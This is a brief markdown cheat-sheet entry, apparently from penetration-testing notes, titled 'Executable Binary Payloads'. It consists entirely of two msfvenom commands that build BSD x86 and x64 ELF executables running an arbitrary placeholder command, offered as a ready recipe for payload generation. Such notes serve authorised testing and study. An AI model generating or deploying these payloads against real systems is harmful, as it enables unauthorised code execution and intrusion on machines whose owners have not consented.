# Executable Binary Payloads

## 01 - Generate Payloads

## Execute BSD Exec Payload

```
$ msfvenom -p bsd/x86/exec cmd="<commands>" -f elf -o payload-x86

$ msfvenom -p bsd/x64/exec cmd="<commands>" -f elf -o payload-x64
```